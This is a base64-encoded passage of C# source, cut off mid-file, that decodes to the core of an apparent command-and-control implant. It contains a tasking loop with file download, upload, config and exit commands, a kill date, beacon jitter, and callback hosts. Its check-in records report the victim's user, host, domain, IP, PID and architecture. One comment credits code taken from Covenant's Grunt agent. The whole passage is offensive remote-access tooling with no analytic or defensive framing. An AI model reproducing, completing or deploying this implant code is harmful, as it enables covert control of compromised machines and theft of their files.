ZXMuQW55KCkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIm5vIGFzc2VtYmxpZXMgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEFzc2VtYmxpZXMgPSBNb2R1bGVzLkxpc3RBc3NlbWJsaWVzKCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBBc3NlbWJsaWVzOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiZG93bmxvYWQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua19udW0gIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgY2h1bmsgPSBNb2R1bGVzLkRvd25sb2FkLkdldENodW5rKEpvYi5wYXJhbWV0ZXJzLCBKb2IuY2h1bmtfbnVtLCBKb2IudG90YWxfY2h1bmtzLCBKb2IuZmlsZV9zaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLkFkZChjaHVuayk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInVwbG9hZCI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLndyaXRlX251bSA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChTeXN0ZW0uSU8uRmlsZS5FeGlzdHMoSm9iLnBhdGgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkVycm9yIGZpbGUgYWxyZWFkeSBleGlzdHMiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rcy5Db3VudCAhPSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKE1vZHVsZXMuVXBsb2FkKEpvYi5wYXRoLCBKb2IuY2h1bmtzWzBdKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi53cml0ZV9udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmUoSm9iLmNodW5rc1swXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi53cml0ZV9udW0gPT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJjb25maWciOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5wYXJhbWV0ZXJzLlRvTG93ZXIoKSA9PSAiaW5mbyIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gTW9kdWxlcy5HZXRDb25maWcoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmKE1vZHVsZXMuU2V0Q29uZmlnKEpvYi5wYXJhbWV0ZXJzLlRvTG93ZXIoKSkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkNvbmZpZ3VyYXRpb24gc3VjY2Vzc2Z1bGx5IHVwZGF0ZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiRXJyb3IgY291bGQgbm90IHVwZGF0ZSBjb25maWciOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiZXhpdCI6DQogICAgICAgICAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImpvYnMiOg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImpvYmtpbGwiOg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ29tbWFuZCBub3QgaW1wbGVtZW50ZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFJlbW92ZUpvYihKb2IgSm9iLCBKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAiZG93bmxvYWQiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgSm9iTGlzdC5qb2JzLlJlbW92ZShKb2IpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkLkFib3J0KCk7DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5SZW1vdmUoSm9iKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBDaGVja0RhdGUoKQ0KICAgICAgICB7DQogICAgICAgICAgICBEYXRlVGltZSBraWxsID0gRGF0ZVRpbWUuUGFyc2UoQ29uZmlnLktpbGxEYXRlKTsNCiAgICAgICAgICAgIERhdGVUaW1lIGRhdGUgPSBEYXRlVGltZS5Ub2RheTsNCiAgICAgICAgICAgIGlmIChEYXRlVGltZS5Db21wYXJlKGtpbGwsIGRhdGUpID49IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCBHZXREd2VsbFRpbWUoKQ0KICAgICAgICB7DQogICAgICAgICAgICBkb3VibGUgSGlnaCA9IENvbmZpZy5TbGVlcCArIChDb25maWcuU2xlZXAgKiAoQ29uZmlnLkppdHRlciAqIDAuMDEpKTsNCiAgICAgICAgICAgIGRvdWJsZSBMb3cgPSBDb25maWcuU2xlZXAgLSAoQ29uZmlnLlNsZWVwICogKENvbmZpZy5KaXR0ZXIgKiAwLjAxKSk7DQogICAgICAgICAgICBSYW5kb20gcmFuZG9tID0gbmV3IFJhbmRvbSgpOw0KICAgICAgICAgICAgaW50IER3ZWxsID0gcmFuZG9tLk5leHQoQ29udmVydC5Ub0ludDMyKExvdyksIENvbnZlcnQuVG9JbnQzMihIaWdoKSk7DQogICAgICAgICAgICByZXR1cm4gRHdlbGwgKiAxMDAwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0SVBBZGRyZXNzKCkNCiAgICAgICAgew0KICAgICAgICAgICAgSVBIb3N0RW50cnkgSG9zdCA9IGRlZmF1bHQoSVBIb3N0RW50cnkpOw0KICAgICAgICAgICAgc3RyaW5nIEhvc3RuYW1lID0gbnVsbDsNCiAgICAgICAgICAgIEhvc3RuYW1lID0gU3lzdGVtLkVudmlyb25tZW50Lk1hY2hpbmVOYW1lOw0KICAgICAgICAgICAgSG9zdCA9IERucy5HZXRIb3N0RW50cnkoSG9zdG5hbWUpOw0KICAgICAgICAgICAgc3RyaW5nIGlwID0gIiI7DQogICAgICAgICAgICBmb3JlYWNoIChJUEFkZHJlc3MgSVAgaW4gSG9zdC5BZGRyZXNzTGlzdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoSVAuQWRkcmVzc0ZhbWlseSA9PSBTeXN0ZW0uTmV0LlNvY2tldHMuQWRkcmVzc0ZhbWlseS5JbnRlck5ldHdvcmspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpcCA9IENvbnZlcnQuVG9TdHJpbmcoSVApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBpcDsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldEFyY2goKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgYXJjaCA9ICIiOw0KICAgICAgICAgICAgaWYgKEludFB0ci5TaXplID09IDgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYXJjaCA9ICJ4NjQiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGFyY2ggPSAieDg2IjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBhcmNoOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0U2Vzc2lvbklkKCkNCiAgICAgICAgew0KICAgICAgICAgICAgUmFuZG9tIHJhbmRvbSA9IG5ldyBSYW5kb20oKTsNCiAgICAgICAgICAgIGNvbnN0IHN0cmluZyBjaGFycyA9ICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkiOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBzdHJpbmcoRW51bWVyYWJsZS5SZXBlYXQoY2hhcnMsIDIwKS5TZWxlY3QocyA9PiBzW3JhbmRvbS5OZXh0KHMuTGVuZ3RoKV0pLlRvQXJyYXkoKSk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBTdG9sZSBmcm9tIENvdmVuYW50J3MgR3J1bnQNCiAgICAgICAgLy8gQWRhcHRlZCBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9tb25vL21vbm8vYmxvYi9tYXN0ZXIvbWNzL2NsYXNzL1N5c3RlbS5XZWIvU3lzdGVtLldlYi9IdHRwVXRpbGl0eS5jcw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHN0cmluZyB2YWx1ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKFN0cmluZy5Jc051bGxPckVtcHR5KHZhbHVlKSkgeyByZXR1cm4gU3RyaW5nLkVtcHR5OyB9DQogICAgICAgICAgICBpbnQgbGVuID0gdmFsdWUuTGVuZ3RoOw0KICAgICAgICAgICAgYm9vbCBuZWVkRW5jb2RlID0gZmFsc2U7DQogICAgICAgICAgICBjaGFyIGM7DQogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGxlbjsgaSsrKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGMgPSB2YWx1ZVtpXTsNCiAgICAgICAgICAgICAgICBpZiAoYyA+PSAwICYmIGMgPD0gMzEgfHwgYyA9PSAzNCB8fCBjID09IDM5IHx8IGMgPT0gNjAgfHwgYyA9PSA2MiB8fCBjID09IDkyKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbmVlZEVuY29kZSA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICghbmVlZEVuY29kZSkgeyByZXR1cm4gdmFsdWU7IH0NCg0KICAgICAgICAgICAgdmFyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsNCiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbGVuOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYyA9IHZhbHVlW2ldOw0KICAgICAgICAgICAgICAgIGlmIChjID49IDAgJiYgYyA8PSA3IHx8IGMgPT0gMTEgfHwgYyA+PSAxNCAmJiBjIDw9IDMxIHx8IGMgPT0gMzkgfHwgYyA9PSA2MCB8fCBjID09IDYyKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kRm9ybWF0KCJcXHV7MDp4NH0iLCAoaW50KWMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKChpbnQpYykNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA4Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXHQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMTA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXG4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMTI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXGYiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMTM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXHIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMzQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXFwiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDkyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZCgiXFxcXCIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoYyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHZXRTZXJ2ZXJzKCkNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIGRvbWFpbiBpbiBDb25maWcuQ2FsbGJhY2tIb3N0cykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBTZXJ2ZXIgc2VydmVyID0gbmV3IFNlcnZlcg0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZG9tYWluID0gZG9tYWluLA0KICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDANCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzLkFkZChzZXJ2ZXIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFNlcnZlcg0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGRvbWFpbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNvdW50IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBDaGVja0luDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgaXAgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBvcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHVzZXIgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBob3N0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZG9tYWluIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgcGlkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXVpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFyY2hpdGVjdHVyZSB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJpcCIiOiIiezF9IiIsIiJvcyIiOiIiezJ9IiIsIiJ1c2VyIiI6IiJ7M30iIiwiImhvc3QiIjoiIns0fSIiLCIiZG9tYWluIiI6IiJ7NX0iIiwiInBpZCIiOns2fSwiInV1aWQiIjoiIns3fSIiLCIiYXJjaGl0ZWN0dXJlIiI6IiJ7OH0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKENoZWNrSW4gY2hlY2tpbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tpbi5Kc29uRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4uYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLmlwKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLm9zKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLnVzZXIpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4uaG9zdCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5kb21haW4pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4ucGlkLlRvU3RyaW5nKCkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4udXVpZCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5hcmNoaXRlY3R1cmUpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQoNCiAgICAgICAgcHVibGljIGNsYXNzIENoZWNrSW5SZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGlkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc3RhdHVzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQ2hlY2tJblJlc3BvbnNlRm9ybWF0ID0gQCJ7eyIic3RhdHVzIiI6ICIiezB9IiIsICIiaWQiIjogIiJ7MX0iIiwgIiJhY3Rpb24iIjogIiJ7Mn0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIENoZWNrSW5SZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gQ2hlY2tJblJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIENoZWNrSW5SZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IENoZWNrSW5SZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICBpZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBHZXRUYXNraW5nDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdGFza2luZ19zaXplIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiInRhc2tpbmdfc2l6ZSIiOnsxfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKEdldFRhc2tpbmcgZ2V0X3Rhc2tpbmcpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIGdldF90YXNraW5nLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3Rhc2tpbmcuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfdGFza2luZy50YXNraW5nX3NpemUuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEdldFRhc2tpbmdSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxUYXNrPiB0YXNrcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBHZXRUYXNraW5nUmVzcG9uc2UoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRhc2tzID0gbmV3IExpc3Q8VGFzaz4oKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0VGFza2luZ1Jl